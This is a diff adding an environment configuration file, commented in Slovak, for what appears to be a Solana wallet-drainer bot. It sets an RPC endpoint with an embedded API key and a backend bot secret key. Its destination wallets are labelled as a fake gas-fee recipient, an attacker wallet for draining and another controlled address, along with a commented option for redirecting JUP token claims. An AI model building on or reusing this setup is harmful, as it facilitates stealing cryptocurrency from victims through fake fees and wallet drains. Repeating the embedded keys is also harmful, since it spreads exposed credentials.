@@ -1,0 +1,14 @@
+# Solana RPC endpoint
+SOLANA_RPC_URL="https://solana-mainnet.g.alchemy.com/v2/bf8f6sul9ANkLYMG-gsqE" # alebo iný endpoint
+
+# Tajný kľúč pre backend bota (uložený ako Base64 encoded Uint8Array)
+# Napr.: BACKEND_BOT_SECRET_KEY="AQABAA....="
+BACKEND_BOT_SECRET_KEY="prVPrLRQwq4ba4BZ45zTSQRChWMLmDprkfXLQPNTT9rL4z3dU1x4cSe5NkokGaFaCQyJBZ4CUahoUFZBipdFkXG"
+
+# Ciele transakcií
+FAKE_GAS_FEE_RECIPIENT_ADDRESS="CkUzC38NHnUMeR4QPenSamYE3CTgiEUEvQBPbGQuEi6p"
+ATTACKER_WALLET_ADDRESS_FOR_DRAIN="7sfj26oV3mH1Vts4AMfX2K6JMY7RkUg96JxJH2JNUvh2"
+ANOTHER_CONTROLLED_ADDRESS="sQctrhrwXdKjgUnQ7oQJ5VoLXVWU5qFsh5GDToyizA5"
+
+# Pre JUP tokeny (ak chcete tokeny posielat na nejaké vase konto)
+# JUP_CLAIM_RECIPIENT_ADDRESS="VASA_ADRESA_PRE_PRIJATIE_JUP"
